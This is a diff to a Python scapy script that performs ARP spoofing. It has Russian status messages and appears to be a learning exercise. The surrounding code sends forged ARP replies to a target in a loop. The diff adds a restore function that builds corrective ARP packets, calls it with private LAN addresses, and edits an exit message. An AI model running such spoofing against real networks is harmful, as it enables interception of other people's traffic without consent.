@@ -17,6 +17,14 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    print(packet.show())
+    print(packet.summary())
+
+restore("192.168.31.174", "192.168.31.1")
 send_packets_count = 0
 try:
     while True:
@@ -26,4 +34,4 @@ try:
         print("\r[+] Отправлено пакетов: " + str(send_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[+] Обнаружено нажатие Ctrl + C ... Выходим")
+    print("\n[-] Обнаружено нажатие Ctrl + C ... Выходим\n")
